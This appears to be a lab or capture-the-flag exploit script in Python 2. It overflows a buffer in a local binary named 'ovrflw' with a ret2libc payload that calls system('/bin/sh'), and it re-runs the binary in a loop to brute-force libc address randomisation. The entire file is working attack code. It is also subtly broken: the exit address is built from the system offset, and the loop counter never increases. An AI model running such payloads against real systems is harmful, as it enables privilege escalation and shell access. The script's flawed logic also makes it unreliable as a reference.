from subprocess import call
import struct

libc_base_addr = 0xb75e0000

# Offset address of system
system_offset = 0x00040310

# Offset address of exit
exit_offset = 0x00033260

# Offset address of /bin/sh
arg_offset = 0x00162bac

# Memory address of system
system_addr = struct.pack("<I",libc_base_addr+system_offset)

# Memory address of system
exit_addr = struct.pack("<I",libc_base_addr+system_offset)

# Memory address of /bin/sh
arg_addr = struct.pack("<I",libc_base_addr+arg_offset)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

i = 0
while (i < 512):
    print "Try: %s" %i
    i += i
    ret = call(["/usr/local/bin/ovrflw", buf])
